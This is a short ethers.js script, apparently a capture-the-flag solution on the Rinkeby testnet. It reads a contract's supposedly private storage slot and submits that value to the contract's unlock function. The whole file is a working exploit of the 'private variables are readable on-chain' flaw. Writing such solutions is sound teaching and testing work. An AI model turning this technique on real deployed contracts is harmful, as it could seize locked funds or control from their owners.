const { ethers } = require("ethers");
require("dotenv").config();
const ABI = require("./ABI.json");

let provider = ethers.providers.getDefaultProvider("rinkeby");
const contractAddress = "0x4f02129bD67d6a8C6dAb42F18fadEd562E1FD1f7";
const contract = new ethers.Contract(contractAddress, ABI, provider);

const privateKey = process.env.PRIVATEKEY;
const wallet = new ethers.Wallet(privateKey, provider);

const contractWithSigner = contract.connect(wallet);

const contractInteraction = async () => {
    const result = await provider.getStorageAt(contractAddress, 1);
    const tx = await contractWithSigner.unlock(result);
    await provider.waitForTransaction(tx.hash);
    console.log("Done!");
};

contractInteraction();
